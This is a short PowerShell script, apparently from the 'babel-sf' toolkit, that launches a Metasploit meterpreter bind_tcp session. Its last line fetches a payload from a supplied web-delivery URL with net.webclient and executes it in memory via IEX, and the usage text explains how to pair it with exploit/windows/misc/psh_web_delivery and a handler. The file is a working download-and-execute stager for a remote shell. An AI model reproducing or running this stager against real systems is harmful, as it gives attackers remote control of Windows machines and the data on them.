#########################################################
# 
# msf-meterpreter-bind_tcp.ps1 version 0.1
#
# babel-sf ( https://github.com/attackdebris/babel-sf )
#
#########################################################

param (
	[Parameter()]
	[ValidateNotNullOrEmpty()]
	[string]$psh_http_server,
	[switch]$h,
	[switch]$help
)

if ($psh_http_server -eq "" -Or $psh_http_server -eq "-h" -Or $psh_http_server -eq "--h" -Or $psh_http_server-eq "-help" -Or $psh_http_server -eq "--help" ) {
echo "msf-meterpreter-bind_tcp.ps1 ( https://github.com/attackdebris/babel-sf )"
echo "`n[This script should be utilised with exploit/windows/misc/psh_web_delivery and a windows/meterpreter/bind_tcp payload]"
echo "[When configuring psh_web_delivery ensure the correct payload architecture is selected i.e. x86 or x64]"
echo "`nUsage:"
echo ".\msf-meterpreter-bind_tcp.ps1 [psh_web_delivery URI]"
echo "e.g. .\msf-meterpreter-bind_tcp http://192.168.0.1:8080/psh-payload`n"
Exit
}
elseif  ($psh_http_server -ne "") {
echo "Starting msf-meterpreter-bind_tcp.ps1 ( https://github.com/attackdebris/babel-sf )`n"
echo "bind session started, connect with exploit/multi/handler on your choosen port/payload....`n"
IEX ((new-object net.webclient).downloadstring("$psh_http_server"))
}